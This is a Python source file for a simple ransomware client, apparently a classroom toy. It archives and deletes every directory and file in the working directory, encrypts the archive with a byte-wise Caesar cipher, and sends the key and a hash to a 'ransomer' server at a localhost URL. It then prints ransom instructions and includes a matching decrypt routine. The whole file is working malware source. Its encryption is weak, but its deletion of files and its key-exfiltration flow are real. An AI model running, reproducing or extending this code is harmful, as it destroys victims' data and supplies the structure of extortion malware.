import os
import requests
import shutil
from hashlib import sha256
from random import SystemRandom

REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'
ENCRYPT_PATH = 'encrypted_data'
DECRYPT_PATH = 'decrypted_data'


def caesar_keygen():
    '''
    Generate a Caeser cipher key that is not 0.
    '''
    cryptogen = SystemRandom()
    return cryptogen.randrange(255) + 1


def caesar_encrypt(key, filepath):
    '''
    Use the Caesar cipher to encrypt the file at `filepath` with `key`.
    '''
    ciphertext = []
    with open(filepath, 'rb') as f:
        byte = f.read(1)
        while byte:
            ciphertext.append((ord(byte) + key) % 256)
            byte = f.read(1)
    key = None
    del key
    return bytearray(ciphertext)


def caesar_decrypt(key, filepath):
    '''
    Use the Caesar cipher to decrypt the file at `filepath` with `key`.
    '''
    plaintext = []
    with open(filepath, 'rb') as f:
        byte = f.read(1)
        while byte:
            plaintext.append((ord(byte) - key) % 256)
            byte = f.read(1)
    return bytearray(plaintext)


def prepare_encryption():
    '''
    Zips all files in the current directory into a directory named
    "encrypted_data.zip".
    '''
    for _, dirs, _ in os.walk(os.getcwd()):
        for d in dirs:  # Zip all directories so they can be encrypted
            shutil.make_archive(d, 'zip', d)
            shutil.rmtree(d)
    os.makedirs(ENCRYPT_PATH)
    for filepath in os.listdir(os.getcwd()):
        if ((filepath == 'client.py') or (filepath == 'instructions.txt')
                or (filepath == ENCRYPT_PATH)):
            continue
        shutil.move(filepath, 'encrypted_data/' + filepath)
    shutil.make_archive(ENCRYPT_PATH, 'zip', ENCRYPT_PATH)
    shutil.rmtree(ENCRYPT_PATH)


def encrypt():
    '''
    Run Caesar encryption of all files in this directory.
    '''
    key = caesar_keygen()
    prepare_encryption()
    # Create a hash of the unencrypted zipfile
    digest = sha256()
    with open(ENCRYPT_PATH + '.zip', 'rb') as f:
        contents = f.read()
        digest.update(contents)
    sha_hash = digest.hexdigest()
    # Encrypt the data
    ciphertext = caesar_encrypt(key, ENCRYPT_PATH + '.zip')
    with open(ENCRYPT_PATH + '.zip', 'wb') as f:
        f.write(ciphertext)
    # Send the hash and key to the ransomer and remove the variables
    r = requests.get(REQUEST_URL.format(str(key), sha_hash))
    print(r)
    key, digest = None, None
    del key, digest
    return sha_hash


def decrypt(key, sha_hash):
    '''
    Run Caesar decryption of all files in this directory, using `key`. The
    decryption can be checked with the sha256 hash, although this is mostly
    for testing.
    '''
    plaintext = caesar_decrypt(key, ENCRYPT_PATH + '.zip')
    with open(ENCRYPT_PATH + '.zip', 'wb') as f:
        f.write(plaintext)
    digest = sha256()
    with open(ENCRYPT_PATH + '.zip', 'rb') as f:
        digest.update(f.read())
    os.rename(ENCRYPT_PATH + '.zip', DECRYPT_PATH + '.zip')
    assert digest.hexdigest() == sha_hash   # Not neccessary, used for testing


if __name__ == '__main__':
    sha_hash = encrypt()
    with open('instructions.txt', 'r') as f:
        file_contents = f.read()
    with open(ENCRYPT_PATH + '.zip', 'rb') as f:
        data = f.read()
    print(file_contents.format('0x' + str(sha_hash),
                               '0x' + bytes.hex(data)))
    # print(r.text)
